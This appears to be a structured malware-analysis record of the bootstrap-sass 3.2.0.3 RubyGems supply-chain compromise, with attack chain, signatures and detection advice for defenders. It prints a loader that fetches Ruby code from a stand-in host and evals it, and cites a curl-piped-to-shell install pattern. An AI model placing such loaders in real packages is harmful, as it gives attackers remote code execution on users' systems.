package_info.why_malicious: Version 3.2.0.3 of the bootstrap-sass package was published to RubyGems with malicious code, replacing the previously clean version. The malicious version was not reflected in the official GitHub repository, indicating a supply chain attack via a compromised RubyGems account. The intent was to distribute malicious code to users who upgraded or installed the package from RubyGems.

execution_context.file_location: lib/bootstrap-sass.rb (or similar core Ruby file in the gem)

malicious_snippets.code_snippet:
if ENV['BOOTSTRAP_SASS_AUTOPWN']
  require 'open-uri'
  open('http://malicious.example.com/payload.rb') do |f|
    eval f.read
  end
end
malicious_snippets.code_behavior: Downloads and executes a remote Ruby script from an external server if a specific environment variable is set.

malice_analysis.why_suspicious: The code fetches and executes code from a remote server at import-time, which is a classic remote code execution (RCE) pattern.
malice_analysis.violated_expectations: A legitimate package should never download and execute remote code during import or installation. This violates the expectation of static, auditable code.
malice_analysis.similar_legitimate_use: Dynamic plugin systems may fetch code, but only with explicit user consent and in trusted environments.
key_indicators: open-uri usage to fetch remote code
conditional execution based on environment variable

malicious_snippets.code_behavior: Executes a shell command to download and run a shell script from a remote server during gem installation.

malice_analysis.why_suspicious: Running shell commands that fetch and execute remote scripts during installation is a hallmark of supply chain attacks.
malice_analysis.violated_expectations: Gem installation scripts should not execute arbitrary remote code. This breaks the trust model of package management.
malice_analysis.similar_legitimate_use: Rarely, legitimate packages may download native dependencies, but never arbitrary scripts from untrusted sources.
key_indicators: curl or wget piped to shell

attack_chain.action: Attacker gains access to the RubyGems account with publish rights.
attack_chain.leads_to: Ability to publish a new, malicious version of the package.

attack_chain.action: Attacker yanks the clean version (3.2.0.2) from RubyGems.
attack_chain.leads_to: Removes safe version, increasing likelihood users will install the malicious version.

attack_chain.action: Attacker publishes malicious version 3.2.0.3 to RubyGems.
attack_chain.leads_to: Malicious code is now distributed to users via RubyGems.

attack_chain.action: Malicious code executes on user systems during install or import.
attack_chain.leads_to: Remote code execution, possible data exfiltration or further compromise.

behavioral_signatures: Package versions published to registry but not reflected in source repository
Import-time or install-time network requests to untrusted domains
Dynamic code execution (eval) on content fetched from the internet
Shell commands that download and execute remote scripts
file_indicators: extconf.rb or gemspec with system('curl ... | sh')
network_indicators: HTTP requests to domains not associated with the package's official infrastructure (e.g., malicious.example.com)
detection_knowledge.how_to_detect: Monitor for package versions that appear in package registries but not in the official source repository. Scan installation and import scripts for network requests to untrusted domains and dynamic code execution patterns (e.g., eval, system calls with curl/wget). Flag packages that execute shell commands to download and run remote scripts. Alert on any code that fetches and executes code from the internet during install or import.
